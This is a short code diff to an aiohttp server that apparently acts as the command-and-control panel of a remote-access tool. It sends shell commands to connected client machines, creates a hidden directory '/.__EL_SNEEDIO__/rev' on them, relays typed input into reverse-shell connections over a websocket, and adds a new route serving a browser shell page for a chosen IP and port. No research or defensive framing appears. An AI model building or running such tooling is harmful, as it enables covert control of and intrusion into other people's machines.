@@ -27,13 +27,22 @@ async def rev(request):
     await ws.prepare(request)
     ip = request.match_info["ip"]
     port = request.match_info["port"]
-    token = str(await shared.comm.clients[(ip, int(port))].msg("ls /.__EL_SNEEDIO__/rev &"), "utf8")
+    token = str(await shared.comm.clients[(ip, int(port))].msg("mkdir -p /.__EL_SNEEDIO__/rev;ls /.__EL_SNEEDIO__/rev &"), "utf8")
     shared.ws_clients[token] = ws
 
     try:
         async for msg in ws:
-            shared.rev.clients[token][1].write(bytes(msg.data, "utf8"))
+            a = msg.data
+            if a == '\r': a = '\n'
+            shared.rev.clients[token][1].write(bytes(a, "utf8"))
             await shared.rev.clients[token][1].drain()
     finally:
         del shared.ws_clients[token]
         return ws
+
+@routes.get("/shell/{ip}/{port}")
+async def shell(request):
+    return aiohttp_jinja2.render_template("shell.html", request, context={
+        "ip": request.match_info["ip"],
+        "port": request.match_info["port"]
+    })
